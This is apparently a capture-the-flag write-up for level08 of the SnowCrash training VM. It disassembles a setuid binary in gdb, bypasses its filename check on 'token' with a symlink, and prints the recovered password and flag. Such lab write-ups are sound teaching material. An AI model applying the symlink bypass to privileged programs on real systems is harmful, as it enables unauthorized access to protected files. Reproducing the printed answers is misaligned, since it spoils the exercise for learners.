# SnowCrash

## Level08

```sh
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

```sh
(gdb) disas main
Dump of assembler code for function main:
	...
   0x080485af <+91>:    movl   $0x8048793,0x4(%esp) #Needle of strstr
   0x080485b7 <+99>:    mov    %eax,(%esp)
   0x080485ba <+102>:   call   0x8048400 <strstr@plt> # First we can see that strstr is called
   0x080485bf <+107>:   test   %eax,%eax # It check the return value of strstr inside an if
   0x080485c1 <+109>:   je     0x80485e9 <main+149> # If the condition is valid we jump to BLOCK B 
   # otherwise BLOCK A is executed

   0x080485c3 <+111>:   mov    0x1c(%esp),%eax # BLOCK A
   0x080485c7 <+115>:   add    $0x4,%eax
   0x080485ca <+118>:   mov    (%eax),%edx
   0x080485cc <+120>:   mov    $0x8048799,%eax
   0x080485d1 <+125>:   mov    %edx,0x4(%esp)
   0x080485d5 <+129>:   mov    %eax,(%esp)
   0x080485d8 <+132>:   call   0x8048420 <printf@plt>
   0x080485dd <+137>:   movl   $0x1,(%esp)
   0x080485e4 <+144>:   call   0x8048460 <exit@plt>


   0x080485e9 <+149>:   mov    0x1c(%esp),%eax # BLOCK B
   ...
End of assembler dump.
```

esp is the first argument of strstr (haystack) and esp+4 is the second argument of strstr(needle)
Haystack is probably argv[0] which is the filename, let's check what it is being compared to (probably "token")

```sh
(gdb) x/s 0x8048793
0x8048793:       "token"
```

Let's try with a symlink in order to bypass the strstr check

```sh
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/exploit
level08@SnowCrash:~$ ./level08 /tmp/exploit
quif5eloekouj29ke0vouxean

level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```